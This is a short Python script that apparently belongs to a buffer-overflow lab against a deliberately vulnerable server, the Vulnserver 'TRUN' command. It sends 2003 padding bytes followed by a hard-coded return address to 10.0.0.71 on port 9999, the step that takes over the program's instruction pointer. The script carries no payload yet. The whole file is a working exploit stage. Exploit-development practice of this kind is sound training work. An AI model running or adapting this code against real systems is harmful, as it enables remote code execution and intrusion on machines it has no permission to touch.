#!/usr/bin/python
from __future__ import print_function
import sys, socket

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       s.connect(('10.0.0.71',9999))
       s.send(('TRUN /.:/' + shellcode))
       s.close()

except:
       print("Error connecting to server")
       sys.exit()
